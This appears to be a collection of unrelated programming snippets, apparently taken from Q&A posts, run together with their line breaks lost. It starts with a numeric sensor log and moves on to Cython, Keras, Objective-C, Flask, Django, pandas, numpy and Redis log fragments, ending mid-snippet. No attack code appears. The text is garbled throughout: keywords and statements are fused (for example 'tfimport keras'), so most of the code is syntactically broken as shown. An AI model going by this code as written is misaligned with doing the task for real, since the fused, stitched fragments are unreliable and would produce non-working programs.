11/11/10 15:00:51 14.24 18.44 10.96 2.50 0.865 0.7 13.3 11/11/10 15:00:52 14.25 18.45 10.97 2.49 0.917 1.2 7.3 11/11/10 15:00:53 14.24 18.45 10.97 2.49 0.964 0.5 4.8 11/11/10 15:00:54 14.25 18.44 10.97 2.49 0.967 0.6 9.7 11/11/10 15:00:55 14.25 18.44 10.97 2.49 1.024 0.5 8.1 11/11/10 15:00:56 14.25 18.45 10.97 2.49 1.042 1.0 14.3 11/11/10 15:00:57 14.25 18.45 10.97 2.49 1.074 0.7 6.0 11/11/10 15:00:58 14.26 18.46 10.97 2.49 1.093 0.9 9.0 11/11/10 15:00:59 14.26 18.46 10.98 2.49 1.145 0.7 9.1 11/11/10 15:01:00 14.26 18.46 10.98 2.49 1.155 1.7 8.6 11/11/10 15:01:01 14.25 18.47 10.98 2.49 1.205 0.7 8.8 11/11/10 15:01:02 14.25 18.48 10.99 2.49 1.237 0.8 12.9 11/11/10 15:01:03 14.26 18.48 10.99 2.49 1.248 0.7 7.2 11/11/10 15:01:04 14.27 18.50 11.00 2.48 1.305 1.2 9.8 11/11/10 15:01:05 14.28 18.50 11.00 2.48 1.328 0.7 10.6 11/11/10 15:01:06 14.29 18.49 11.00 2.48 1.367 0.6 5.4 11/11/10 15:01:07 14.29 18.51 11.01 2.48 1.387 0.8 9.2 11/11/10 15:01:08 14.30 18.51 11.01 2.48 1.425 0.6 14.1 11/11/10 15:01:09 14.31 18.52 11.01 2.48 1.456 4.0 11.3 11/11/10 15:01:10 14.31 18.52 11.01 2.47 1.485 2.5 5.3 11/11/10 15:01:11 14.31 18.51 11.01 2.47 1.490 0.7 5.2 11/11/10 15:01:12 14.32 18.52 11.01 2.47 1.576 0.6 6.6 11/11/10 15:01:13 14.32 18.51 11.01 2.47 1.551 0.7 7.7 11/11/10 15:01:14 14.31 18.49 10.99 2.47 1.627 0.6 7.3 11/11/10 15:01:15 14.29 18.47 10.98 2.47 1.620 0.7 11.5 11/11/10 15:01:16 14.28 18.48 10.99 2.48 1.659 0.8 7.0 11/11/10 15:01:17 14.27 18.49 10.99 2.48 1.682 1.4 14.4 11/11/10 15:01:18 14.26 18.49 11.00 2.48 1.724 1.0 2.9 11/11/10 15:01:19 14.27 18.52 11.01 2.48 1.756 0.8 13.5 11/11/10 15:01:20 14.28 18.52 11.01 2.47 1.752 5.3 11.7 11/11/10 15:01:21 14.29 18.52 11.02 2.47 1.841 0.8 5.8 11/11/10 15:01:22 14.30 18.52 11.01 2.47 1.789 1.0 5.5 11/11/10 15:01:23 14.31 18.52 11.01 2.47 1.868 0.7 6.8 11/11/10 15:01:24 14.31 18.52 11.02 2.47 1.848 0.8 7.8 11/11/10 15:01:25 14.32 18.52 11.01 2.47 1.896 0.3 8.3 11/11/10 15:01:26 14.32 18.52 11.01 2.47 1.923 0.9 4.8 11/11/10 15:01:27 14.32 18.51 11.01 2.47 1.936 0.5 6.4 11/11/10 15:01:28 14.32 18.52 11.01 2.46 1.960 0.9 10.0 11/11/10 15:01:29 14.31 18.52 11.01 2.46 1.996 0.6 10.7 11/11/10 15:01:30 14.31 18.52 11.01 2.47 2.024 1.7 11.8 11/11/10 15:01:31 14.31 18.52 11.01 2.47 2.031 1.0 11.7 11/11/10 15:01:32 14.31 18.53 11.02 2.46 2.110 1.3 5.4 11/11/10 15:01:33 14.32 18.52 11.01 2.46 2.067 0.6 12.2 11/11/10 15:01:34 14.32 18.52 11.01 2.46 2.144 0.4 6.4 11/11/10 15:01:35 14.32 18.51 11.01 2.46 2.148 1.0 4.6 11/11/10 15:01:36 14.33 18.51 11.01 2.46 2.172 0.9 9.6 11/11/10 15:01:37 14.33 18.52 11.01 2.46 2.221 1.0 6.5 11/11/10 15:01:38 14.33 18.51 11.01 2.46 2.219 0.3 7.6 11/11/10 15:01:39 14.33 18.51 11.01 2.46 2.278 1.2 8.1 11/11/10 15:01:40 14.32 18.51 11.01 2.46 2.258 0.5 0.6 11/11/10 15:01:41 14.32 18.52 11.01 2.46 2.329 1.2 8.2 11/11/10 15:01:42 14.31 18.51 11.01 2.46 2.321 1.1 9.6 11/11/10 15:01:43 14.31 18.51 11.01 2.46 2.382 1.0 5.3 11/11/10 15:01:44 14.31 18.51 11.01 2.46 2.357 0.7 8.5 11/11/10 15:01:45 14.31 18.52 11.01 2.46 2.449 0.4 10.3 11/11/10 15:01:46 14.31 18.52 11.01 2.46 2.430 0.6 10.0 11/11/10 15:01:47 14.31 18.52 11.01 2.46 2.472 0.6 11.3 11/11/10 15:01:48 14.31 18.52 11.01 2.45 2.510 1.2 8.5 11/11/10 15:01:49 14.31 18.51 11.01 2.45 2.516 0.7 9.5 11/11/10 15:01:50 14.31 18.52 11.01 2.45 2.529 0.5 9.6 11/11/10 15:01:51 14.31 18.52 11.01 2.45 2.575 0.7 8.2 11/11/10 15:01:52 14.31 18.51 11.01 2.46 2.578 0.5 9.4 11/11/10 15:01:53 14.31 18.51 11.01 2.46 2.592 0.8 5.5 11/11/10 15:01:54 14.30 18.51 11.01 2.46 2.666 0.6 7.1 11/11/10 15:01:55 14.30 18.51 11.01 2.46 2.603 0.7 11.5 11/11/10 15:01:56 14.29 18.52 11.01 2.45 2.707 0.9 7.2 11/11/10 15:01:57 14.29 18.52 11.01 2.45 2.673 0.7 9.2 11/11/10 15:01:58 14.28 18.52 11.01 2.45 2.705 0.7 6.4 11/11/10 15:01:59 14.28 18.52 11.01 2.45 2.720 1.3 6.8 11/11/10 15:02:00 14.28 18.52 11.02 2.45 2.778 0.7 7.5 11/11/10 15:02:01 14.27 18.52 11.02 2.45 2.724 0.5 8.0 11/11/10 15:02:02 14.27 18.51 11.01 2.45 2.840 0.9 10.0 11/11/10 15:02:03 14.26 18.52 11.02 2.45 2.758 0.8 6.4 11/11/10 15:02:04 14.26 18.52 11.01 2.46 2.874 0.4 9.7 11/11/10 15:02:05 14.24 18.53 11.02 2.46 2.824 1.1 10.8 11/11/10 15:02:06 14.24 18.53 11.02 2.46 2.896 1.0 8.8 11/11/10 15:02:07 14.22 18.53 11.02 2.47 2.903 0.6 16.3 11/11/10 15:02:08 14.22 18.54 11.03 2.45 2.912 0.9 9.6 11/11/10 15:02:09 14.21 18.54 11.02 2.45 2.949 0.8 6.6 11/11/10 15:02:10 14.20 18.54 11.03 2.45 2.964 1.4 8.4 11/11/10 15:02:11 14.19 18.55 11.03 2.46 2.966 3.0 12.9 11/11/10 15:02:12 14.17 18.55 11.03 2.45 3.020 1.0 7.5 11/11/10 15:02:13 14.15 18.56 11.04 2.45 3.000 1.1 9.5 11/11/10 15:02:14 14.14 18.56 11.04 2.45 3.064 0.9 6.5 11/11/10 15:02:15 14.13 18.56 11.04 2.45 3.037 1.3 8.2 11/11/10 15:02:16 14.13 18.57 11.04 2.45 3.097 1.3 7.7 11/11/10 15:02:17 14.12 18.57 11.05 2.45 3.128 1.5 8.4 11/11/10 15:02:18 14.11 18.58 11.05 2.45 3.104 1.7 7.0 11/11/10 15:02:19 14.10 18.58 11.05 2.45 3.190 1.2 10.2 11/11/10 15:02:20 14.10 18.58 11.05 2.44 3.141 5.8 9.9 11/11/10 15:02:21 14.09 18.60 11.06 2.44 3.199 1.4 4.7 11/11/10 15:02:22 14.07 18.60 11.07 2.44 3.208 1.6 9.4 11/11/10 15:02:23 14.06 18.60 11.07 2.44 3.199 2.1 6.2 11/11/10 15:02:24 14.06 18.62 11.08 2.43 3.259 3.0 9.3 11/11/10 15:02:25 14.05 18.63 11.08 2.43 3.228 1.6 8.9 11/11/10 15:02:26 14.06 18.63 11.08 2.43 3.289 1.6 3.5 11/11/10 15:02:27 14.05 18.64 11.09 2.43 3.278 1.8 2.2 11/11/10 15:02:28 14.05 18.64 11.09 2.43 3.307 2.2 9.7 11/11/10 15:02:29 14.04 18.64 11.09 2.43 3.315 2.3 5.5 11/11/10 15:02:30 14.04 18.65 11.10 2.43 3.367 2.1 5.1 11/11/10 15:02:31 14.03 18.65 11.10 2.43 3.297 2.5 8.5 11/11/10 15:02:32 14.03 18.65 11.10 2.41 3.419 1.9 6.8 11/11/10 15:02:33 14.03 18.65 11.10 2.41 3.347 2.1 4.0 11/11/10 15:02:34 14.03 18.66 11.10 2.41 3.405 2.0 11.8 11/11/10 15:02:35 14.03 18.67 11.11 2.41 3.420 2.4 10.6 11/11/10 15:02:36 14.03 18.67 11.11 2.39 3.369 2.7 10.5 11/11/10 15:02:37 14.02 18.67 11.11 2.39 3.402 1.6 9.1 11/11/10 15:02:38 14.02 18.66 11.11 2.39 3.408 1.9 8.5 11/11/10 15:02:39 14.02 18.67 11.11 2.39 3.362 4.2 7.0 11/11/10 15:02:40 14.02 18.67 11.11 2.38 3.421 2.3 12.1 11/11/10 15:02:41 14.02 18.67 11.11 2.38 3.371 2.6 14.7 11/11/10 15:02:42 14.02 18.67 11.11 2.38 3.409 3.0 6.5 11/11/10 15:02:43 14.02 18.67 11.11 2.38 3.368 2.3 2.5 11/11/10 15:02:44 14.02 18.67 11.11 2.37 3.434 2.5 10.2 11/11/10 15:02:45 14.02 18.67 11.11 2.37 3.346 1.6 4.5"
"cpdef function ( np.ndarray [ np.float32_t , ndim=2 ] response , max_loc ) : cdef unsigned int x , y x , y = int ( max_loc [ 0 ] ) , int ( max_loc [ 1 ] ) x2 , y2 = int ( max_loc [ 0 ] ) , int ( max_loc [ 1 ] ) print response [ y , x ] , type ( response [ y , x ] ) , response.dtype print response [ y2 , x2 ] , type ( response [ y2 , x2 ] ) , response.dtype print 2* ( response [ y , x ] - min ( response [ y , x-1 ] , response [ y , x+1 ] ) ) print 2* ( response [ y2 , x2 ] - min ( response [ y2 , x2-1 ] , response [ y2 , x2+1 ] ) ) 0.959878861904 < type 'float ' > float320.959879 < type 'numpy.float32 ' > float321.043060243131.04306030273 cpdef function ( ) : cdef unsigned int x , y max_loc2 = np.asarray ( [ 15. , 25 . ] , dtype=float ) cdef np.ndarray [ np.float32_t , ndim=2 ] response2 = np.zeros ( ( 49,49 ) , dtype=np.float32 ) x , y = int ( max_loc2 [ 0 ] ) , int ( max_loc2 [ 1 ] ) x2 , y2 = int ( max_loc2 [ 0 ] ) , int ( max_loc2 [ 1 ] ) response2 [ y , x ] = 0.959878861904 response2 [ y , x-1 ] = 0.438348740339 response2 [ y , x+1 ] = 0.753262758255 print response2 [ y , x ] , type ( response2 [ y , x ] ) , response2.dtype print response2 [ y2 , x2 ] , type ( response2 [ y2 , x2 ] ) , response2.dtype print 2* ( response2 [ y , x ] - min ( response2 [ y , x-1 ] , response2 [ y , x+1 ] ) ) print 2* ( response2 [ y2 , x2 ] - min ( response2 [ y2 , x2-1 ] , response2 [ y2 , x2+1 ] ) ) 0.959878861904 < type 'float ' > float320.959879 < type 'numpy.float32 ' > float321.043060243131.04306030273"
"class test_layer ( keras.layers.Layer ) : def __init__ ( self , **kwargs ) : super ( test_layer , self ) .__init__ ( **kwargs ) def build ( self , input_shape ) : self.w = K.variable ( 1 . ) self._trainable_weights.append ( self.w ) super ( test_layer , self ) .build ( input_shape ) def call ( self , x , **kwargs ) : m = x * x # Set break point here n = self.w * K.sqrt ( x ) return m + n import tensorflow as tfimport kerasimport keras.backend as Kinput = keras.layers.Input ( ( 100,1 ) ) y = test_layer ( ) ( input ) model = keras.Model ( input , y ) model.predict ( np.ones ( ( 100,1 ) ) )"
"- ( BOOL ) convertMovieToMP4 : ( NSString ) originalMovPath andStoragePath : ( NSString ) compMovPath { NSURL *tmpSourceUrl = [ NSURL fileURLWithPath : originalMovPath ] ; compMovPath = [ compMovPath stringByReplacingOccurrencesOfString : [ compMovPath pathExtension ] withString : @ '' mp4 '' ] ; NSURL *tmpDestUrl = [ NSURL fileURLWithPath : compMovPath ] ; AVURLAsset* videoAsset = [ [ AVURLAsset alloc ] initWithURL : tmpSourceUrl options : nil ] ; AVMutableComposition* mixComposition = [ AVMutableComposition composition ] ; AVMutableCompositionTrack *compositionVideoTrack = [ mixComposition addMutableTrackWithMediaType : AVMediaTypeVideo preferredTrackID : kCMPersistentTrackID_Invalid ] ; AVAssetTrack *clipVideoTrack = [ [ videoAsset tracksWithMediaType : AVMediaTypeVideo ] objectAtIndex:0 ] ; [ compositionVideoTrack insertTimeRange : CMTimeRangeMake ( kCMTimeZero , videoAsset.duration ) ofTrack : clipVideoTrack atTime : kCMTimeZero error : nil ] ; [ compositionVideoTrack setPreferredTransform : [ [ [ videoAsset tracksWithMediaType : AVMediaTypeVideo ] objectAtIndex:0 ] preferredTransform ] ] ; CGSize videoSize = [ [ [ videoAsset tracksWithMediaType : AVMediaTypeVideo ] objectAtIndex:0 ] naturalSize ] ; CATextLayer *titleLayer = [ CATextLayer layer ] ; titleLayer.string = @ '' Ojatro '' ; titleLayer.font = ( _bridge CFTypeRef Nullable ) ( @ '' Helvetica '' ) ; titleLayer.fontSize = videoSize.height / 8 ; titleLayer.shadowOpacity = 0.2 ; titleLayer.alignmentMode = kCAAlignmentCenter ; titleLayer.bounds = CGRectMake ( 0 , 0 , videoSize.width , videoSize.height / 6 ) ; titleLayer.position=CGPointMake ( videoSize.width/2 , videoSize.height/2 ) ; CALayer *parentLayer = [ CALayer layer ] ; CALayer *videoLayer = [ CALayer layer ] ; parentLayer.frame = CGRectMake ( 0 , 0 , videoSize.width , videoSize.height ) ; videoLayer.frame = CGRectMake ( 0 , 0 , videoSize.width , videoSize.height ) ; [ parentLayer addSublayer : videoLayer ] ; [ parentLayer addSublayer : titleLayer ] ; AVMutableVideoComposition* videoComp = [ AVMutableVideoComposition videoComposition ] ; videoComp.renderSize = videoSize ; videoComp.frameDuration = CMTimeMake ( 1 , 30 ) ; videoComp.animationTool = [ AVVideoCompositionCoreAnimationTool videoCompositionCoreAnimationToolWithPostProcessingAsVideoLayer : videoLayer inLayer : parentLayer ] ; AVMutableVideoCompositionInstruction *instruction = [ AVMutableVideoCompositionInstruction videoCompositionInstruction ] ; instruction.timeRange = CMTimeRangeMake ( kCMTimeZero , [ mixComposition duration ] ) ; AVAssetTrack *videoTrack = [ [ mixComposition tracksWithMediaType : AVMediaTypeVideo ] objectAtIndex:0 ] ; AVMutableVideoCompositionLayerInstruction* layerInstruction = [ AVMutableVideoCompositionLayerInstruction videoCompositionLayerInstructionWithAssetTrack : videoTrack ] ; instruction.layerInstructions = [ NSArray arrayWithObject : layerInstruction ] ; videoComp.instructions = [ NSArray arrayWithObject : instruction ] ; AVAssetExportSession* _assetExport = [ [ AVAssetExportSession alloc ] initWithAsset : mixComposition presetName : AVAssetExportPresetMediumQuality ] ; //AVAssetExportPresetPasst _assetExport.videoComposition = videoComp ; //NSString* videoName = @ '' mynewwatermarkedvideo.mov '' ; NSString *tmpDirPath = [ compMovPath stringByReplacingOccurrencesOfString : [ compMovPath lastPathComponent ] withString : @ '' '' ] ; if ( [ Utility makeDirectoryAtPath : tmpDirPath ] ) { NSLog ( @ '' Directory Created '' ) ; } //exportPath= [ exportPath stringByAppendingString : videoName ] ; NSURL *exportUrl = tmpDestUrl ; if ( [ [ NSFileManager defaultManager ] fileExistsAtPath : compMovPath ] ) { [ [ NSFileManager defaultManager ] removeItemAtPath : compMovPath error : nil ] ; } _assetExport.outputURL = exportUrl ; _assetExport.shouldOptimizeForNetworkUse = YES ; _assetExport.outputFileType = AVFileTypeMPEG4 ; // [ strRecordedFilename setString : exportPath ] ; [ _assetExport exportAsynchronouslyWithCompletionHandler : ^ ( void ) { switch ( _assetExport.status ) { case AVAssetExportSessionStatusUnknown : NSLog ( @ '' Export Status Unknown '' ) ; break ; case AVAssetExportSessionStatusWaiting : NSLog ( @ '' Export Waiting '' ) ; break ; case AVAssetExportSessionStatusExporting : NSLog ( @ '' Export Status '' ) ; break ; case AVAssetExportSessionStatusCompleted : NSLog ( @ '' Export Completed '' ) ; totalFilesCopied++ ; [ self startProgressBar ] ; break ; case AVAssetExportSessionStatusFailed : NSLog ( @ '' Export failed '' ) ; break ; case AVAssetExportSessionStatusCancelled : NSLog ( @ '' Export canceled '' ) ; break ; } } ] ; return NO ; }"
"query = dictify_querystring ( Response.QueryString ) employeedata = conn.execute_row ( `` SELECT * FROM employees WHERE company_id= % s and name = % s '' , ( query [ `` id '' ] , query [ `` name '' ] ) )"
"for x in texts_list : for l in x : if l in term_appearance : term_appearance [ l ] += 1 else : term_appearance [ l ] = 1 from collections import defaultdictterm_appearance = defaultdict ( int ) { { term_appearance [ l ] : term_appearance [ l ] + 1 if l else term_appearance [ l ] : 1 for l in x } for x in texts_list } { { l : term_appearance [ l ] + 1 if l else 1 for l in x } for x in texts_list } [ ] [ ] [ ] [ ] Traceback ( most recent call last ) : File `` term_count_fltr.py '' , line 28 , in < module > { { l : term_appearance [ l ] + 1 if l else 1 for l in x } for x in texts_list } File `` term_count_fltr.py '' , line 28 , in < setcomp > { { l : term_appearance [ l ] + 1 if l else 1 for l in x } for x in texts_list } TypeError : unhashable type : 'dict ' [ { l : term_appearance [ l ] + 1 if l else 1 for l in x } for x in texts_list ]"
EMAIL_USE_TLS = TrueEMAIL_HOST = 'smtp.gmail.com'EMAIL_PORT = 587EMAIL_HOST_USER = 'myUser @ myCompany.com'EMAIL_HOST_PASSWORD = 'apassword ' ... ACCOUNT_ACTIVATION_DAYS = 7
"df [ 'Simple_Avg_Return ' ] = df.groupby ( [ 'YF_Ticker ' ] ) [ 'Share_Price_Delta_Percent ' , 'Dividend_Percent ' ] .transform ( sum ) .divide ( 2 ) .round ( 2 ) FutureWarning : Indexing with multiple keys ( implicitly converted to atuple of keys ) will be deprecated , use a list instead ."
"a = `` 12 I have car 8 200 a '' 8 a car have 12 200 I a = `` 12 I have car 8 200 a '' def is_digit ( element_ ) : `` '' '' Function to check the item is a number . We can make using of default isdigit function but it will not work with negative numbers . : param element_ : : return : is_digit_ `` '' '' try : int ( element_ ) is_digit_ = True except ValueError : is_digit_ = False return is_digit_space_separated = a.split ( ) integers = [ int ( i ) for i in space_separated if is_digit ( i ) ] strings = [ i for i in space_separated if i.isalpha ( ) ] # sort list in placeintegers.sort ( ) strings.sort ( key=str.lower ) # This conversion to iter is to make use of next method.int_iter = iter ( integers ) st_iter = iter ( strings ) final = [ next ( int_iter ) if is_digit ( element ) else next ( st_iter ) if element.isalpha ( ) else element for element in space_separated ] print `` `` .join ( map ( str , final ) ) # 8 a car have 12 200 I"
"import matplotlib.pyplot as pltfrom cycler import cyclerimport numpyimport seabornseaborn.set_style ( 'white ' ) x = range ( 10 ) ys = [ ] for i in range ( 20 ) : ys.append ( numpy.random.uniform ( 1 , 10 , size=10 ) *i ) plt.rc ( 'axes ' , prop_cycle= ( cycler ( 'color ' , [ ' r ' , ' g ' , ' b ' , ' y ' , ' c ' , ' k ' ] ) + cycler ( 'linestyle ' , [ '- ' , ' -- ' , ' : ' , '- . ' , '- ' , ' -- ' ] ) ) ) plt.figure ( ) for i in range ( 20 ) : plt.plot ( x , ys [ i ] , label=i ) plt.legend ( loc= ( 1 , 0.1 ) ) plt.show ( )"
"import numpy as npimport timeim = np.random.rand ( 640,480,3 ) # my `` image '' xx , yy = np.meshgrid ( np.arange ( im.shape [ 1 ] ) , np.arange ( im.shape [ 0 ] ) ) print `` Check these are the right indices : '' , np.sum ( im - im [ yy , xx , : ] ) # perturb the indices slightly # I want to calculate the interpolated # values of `` im '' at these locationsxx = xx + np.random.normal ( size=im.shape [ :2 ] ) yy = yy + np.random.normal ( size=im.shape [ :2 ] ) # integer value/pixel locationsx_0 = np.int_ ( np.modf ( xx ) [ 1 ] ) y_0 = np.int_ ( np.modf ( yy ) [ 1 ] ) x_1 , y_1 = x_0 + 1 , y_0 + 1 # the real-valued offsets/coefficients pixelsa = np.modf ( xx ) [ 0 ] [ : , : ,np.newaxis ] b = np.modf ( yy ) [ 0 ] [ : , : ,np.newaxis ] # make sure we do n't go out of bounds at edge pixelsnp.clip ( x_0,0 , im.shape [ 1 ] -1 , out=x_0 ) np.clip ( x_1,0 , im.shape [ 1 ] -1 , out=x_1 ) np.clip ( y_0,0 , im.shape [ 0 ] -1 , out=y_0 ) np.clip ( y_1,0 , im.shape [ 0 ] -1 , out=y_1 ) # now perform linear interpolation : THIS IS THE BOTTLENECK ! tic = time.time ( ) result = ( ( 1-a ) * ( 1-b ) * im [ y_0 , x_0 , : ] + a * ( 1-b ) * im [ y_1 , x_0 , : ] + ( 1-a ) * b * im [ y_0 , x_1 , : ] + a * b * im [ y_1 , x_1 , : ] ) toc = time.time ( ) print `` interpolation time : '' , toc-tic"
"var dataurl = canvas.toDataURL ( `` image/png '' ) ; $ .ajax ( { type : `` POST '' , url : `` /profil/unternehmen-bearbeiten/resize-image '' , data : { a : dataurl } } ) .done ( function ( ) { console.log ( 'sent ' ) ; } ) ; @ app.route ( '/profil/unternehmen-bearbeiten/resize-image ' , methods= [ `` POST '' ] ) def resize_image ( ) : data_url = request.values [ ' a ' ] content = data_url.split ( ' ; ' ) [ 1 ] image_encoded = content.split ( ' , ' ) [ 1 ] body = base64.decodestring ( image_encoded.encode ( 'utf-8 ' ) ) return body @ app.route ( '/profil/unternehmen-bearbeiten ' , methods= [ `` GET '' , `` POST '' ] ) @ login_required @ check_confirmeddef edit_company ( ) : the_company = Company.query.filter_by ( users_id=current_user.id ) .first ( ) form = EditCompanyForm ( obj=the_company ) used_file = the_company.company_logo_image_path if form.validate_on_submit ( ) : form.populate_obj ( the_company ) imagedata = resize_image ( ) print `` The '' , imagedata if form.company_logo_image_path.data : upload_image_to_aws ( 'baubedarf ' , `` userimages/ '' , form.company_logo_image_path , the_company , 'company_logo_image_path ' , the_company.company_name ) # ... try : print request.values [ ' a ' ] except Exception as e : print `` error '' , e try : print request.form [ 'uploading_canvas ' ] except Exception as e : print `` error 1 '' , e if request.method == 'POST ' : print `` post '' file_data = request.values [ ' a ' ] imagedata = resize_image ( file_data ) print `` The '' , type ( imagedata ) if form.validate_on_submit ( ) : # ... `` '' '' if form.company_check_it.data == True : print `` post 1 '' file_data = request.values [ ' a ' ] imagedata = resize_image ( file_data ) print `` The '' , type ( imagedata ) else : print `` post 3 '' '' '' '' '' '' '' if request.method == 'POST ' : print `` post '' file_data = request.values [ ' a ' ] imagedata = resize_image ( file_data ) print `` The '' , type ( imagedata ) '' '' '' if form.validate_on_submit ( ) : print `` post 2 '' `` '' '' if form.company_check_it.data == True : print `` post 1 '' file_data = request.values [ ' a ' ] imagedata = resize_image ( file_data ) print `` The '' , type ( imagedata ) else : print `` post 3 '' `` '' '' if request.method == 'POST ' : print `` post '' file_data = request.values [ ' a ' ] imagedata = resize_image ( file_data ) print `` The '' , type ( imagedata ) form.populate_obj ( the_company ) `` '' '' data_url = request.values [ ' a ' ] print data_url content = data_url.split ( ' ; ' ) [ 1 ] image_encoded = content.split ( ' , ' ) [ 1 ] body = base64.decodestring ( image_encoded.encode ( 'utf-8 ' ) ) print type ( body ) `` '' ''"
"import sys , tempfile , osfrom subprocess import callEDITOR = os.environ.get ( 'EDITOR ' , 'vim ' ) initial_message = `` '' with tempfile.NamedTemporaryFile ( suffix= '' .tmp '' ) as tempfile : tempfile.write ( initial_message ) tempfile.flush ( ) call ( [ EDITOR , tempfile.name ] ) tempfile < closed file ' < fdopen > ' , mode ' w+b ' at 0x87c47b0 > tempfile.readline ( ) ValueError : I/O operation on closed file myfile = open ( tempfile.name ) IOError : [ Errno 2 ] No such file or directory : '/tmp/tmp7VKzfl.tmp '"
"class Option ( models.Model ) : name = models.CharField ( max_length=60 ) my_model_form_field = forms.ModelChoiceField ( queryset = Option.objects.all ( ) , widget = forms.Select ( ) ) - Yes- No- I do n't know- I do n't want to answer"
"In [ 7 ] : yaml.load ( `` 2001-12-14t21:59:43.10-05:00 '' ) Out [ 7 ] : datetime.datetime ( 2001 , 12 , 15 , 2 , 59 , 43 , 100000 ) In [ 8 ] : yaml.load ( `` 2001-12-14 21:59:43.10 -5 '' ) Out [ 8 ] : datetime.datetime ( 2001 , 12 , 15 , 2 , 59 , 43 , 100000 )"
"using StatsBaset = range ( 0 , stop=10 , length=10 ) test_data = sin. ( exp . ( t.^2 ) ) acf = StatsBase.autocor ( test_data ) 10-element Array { Float64,1 } : 1.0 0.13254954979179642 -0.2030283419321465 0.00029587850872956104 -0.06629381497277881 0.031309038331589614 -0.16633393452504994 -0.08482388975165675 0.0006905628640697538 -0.1443650483145533 from statsmodels.tsa.stattools import acfimport numpy as npt = np.linspace ( 0,10,10 ) test_data = np.sin ( np.exp ( t**2 ) ) acf_result = acf ( test_data ) array ( [ 1. , 0.14589844 , -0.10412699 , 0.07817509 , -0.12916543 , -0.03469143 , -0.129255 , -0.15982435 , -0.02067688 , -0.14633346 ] )"
"class APINode ( object ) : def __init__ ( self , *args , **kwargs ) : # initialize some instance variables def render ( self , arg1 , arg2 ) : # do some stuff and return somethingdef api_function ( arg1 , arg2 ) : # do some stuff return APINode ( args , kwargs ) class MyNode ( APINode ) : def render ( self , arg1 , arg2 ) : # My override of APINode 's render def my_function ( arg1 , arg2 ) : api_parent_instance = api_function ( arg1 , arg2 ) # Can I some how create an instance of MyNode from api_parent_instance here ?"
"2013-04-12 11:25:34+0200 [ RedisProtocol , client ] < twisted.internet.tcp.Connector instance at 0xf6c45d4c > will retry in 10 seconds2013-04-12 11:25:34+0200 [ RedisProtocol , client ] Stopping factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:25:45+0200 [ - ] Starting factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:30:47+0200 [ RedisProtocol , client ] < twisted.internet.tcp.Connector instance at 0xf6c45d4c > will retry in 10 seconds2013-04-12 11:30:47+0200 [ RedisProtocol , client ] Stopping factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:30:58+0200 [ - ] Starting factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:35:59+0200 [ RedisProtocol , client ] < twisted.internet.tcp.Connector instance at 0xf6c45d4c > will retry in 10 seconds2013-04-12 11:35:59+0200 [ RedisProtocol , client ] Stopping factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:36:10+0200 [ - ] Starting factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:41:12+0200 [ RedisProtocol , client ] < twisted.internet.tcp.Connector instance at 0xf6c45d4c > will retry in 8 seconds2013-04-12 11:41:12+0200 [ RedisProtocol , client ] Stopping factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 11:41:21+0200 [ - ] Starting factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 12:29:58+0200 [ HTTPPageGetter , client ] Unhandled error in Deferred:2013-04-12 12:29:58+0200 [ HTTPPageGetter , client ] Unhandled ErrorTraceback ( most recent call last ) : Failure : lib.txredisapi.txredisapi.ConnectionError : Not connected2013-04-12 12:30:03+0200 [ - ] Starting factory < lib.txredisapi.txredisapi.RedisFactory instance at 0xf6c45ccc > 2013-04-12 12:30:22+0200 [ Protocol,20,89.73.182.51 ] Connection from 89.73.182.51:38635 closed . Code : 1006 , Reason : connection was closed uncleanly ( peer dropped the TCP connection without previous WebSocket closing handshake )"
flight_id | from_location | to_location | schedule | 1 | Vancouver | Toronto | 3-Jan | 2 | Amsterdam | Tokyo | 15-Feb | 4 | Fairbanks | Glasgow | 12-Jan | 9 | Halmstad | Athens | 21-Jan | 3 | Brisbane | Lisbon | 4-Feb | 4 | Johannesburg | Venice | 23-Jan |9 | LosAngeles | Perth | 3-Mar |
"@ app.route ( '/sample/route ' , methods= [ 'POST ' ] ) @ require_json_payload @ require_fields ( { 'pid ' , 'params ' } ) def route_handler ( arg1 , arg2 ) : # input filtering ... try : proj_cntr.sample_method ( pid = pid , ... = ... ) except ProjCntrException : # handle error # response generation ... if not project_object : sys_logger.info ( ' ... ' ) raise ProjCntrException ( 'PID % d does not exist ' % pid )"
"cur = conn.cursor ( ) try : cur.execute ( `` SELECT col1 , col2 FROM test_table ORDER BY col1 '' ) for ( col1 , col2 ) in cur : print ( ' { 0 } , { 1 } '.format ( col1 , col2 ) ) finally : cur.close ( ) Traceback ( most recent call last ) : File `` db_connection.py '' , line 48 , in < module > cur.execute ( `` SELECT col1 , col2 FROM test_table ORDER BY col1 '' ) File `` /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/snowflake/connector/cursor.py '' , line 580 , in execute self._init_result_and_meta ( data , _use_ijson ) File `` /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/snowflake/connector/cursor.py '' , line 630 , in _init_result_and_meta self._result = ArrowResult ( data , self , use_dict_result=self._use_dict_result ) File `` arrow_result.pyx '' , line 42 , in snowflake.connector.arrow_result.ArrowResult.__init__ File `` arrow_result.pyx '' , line 156 , in snowflake.connector.arrow_result.ArrowResult._resetNameError : name 'EmptyPyArrowIterator ' is not defined"
"# ! /usr/bin/env python # title : pythonTiming.py # description : Will be used to test timing function in python # author : myusuf # date : 19-11-2014 # version : 0 # usage : python pythonTiming.py # notes : # python_version :2.6.6 # ==============================================================================import timeimport cStringIOimport StringIOclass Timer ( object ) : def __enter__ ( self ) : self.start = time.time ( ) return self def __exit__ ( self , *args ) : self.end = time.time ( ) self.interval = self.end - self.starttestbuf = `` '' '' Hello This is a General String that will be repreatedThis string will be written to a file , StringIO and a sregualr strin then see the best to handle string according to time `` '' '' * 1000MyFile = open ( `` ./testfile.txt '' , '' wb+ '' ) MyStr = `` MyStrIo = StringIO.StringIO ( ) MycStrIo = cStringIO.StringIO ( ) def strWithFiles ( ) : global MyFile print `` writing string to file `` for index in range ( 1000 ) : MyFile.write ( 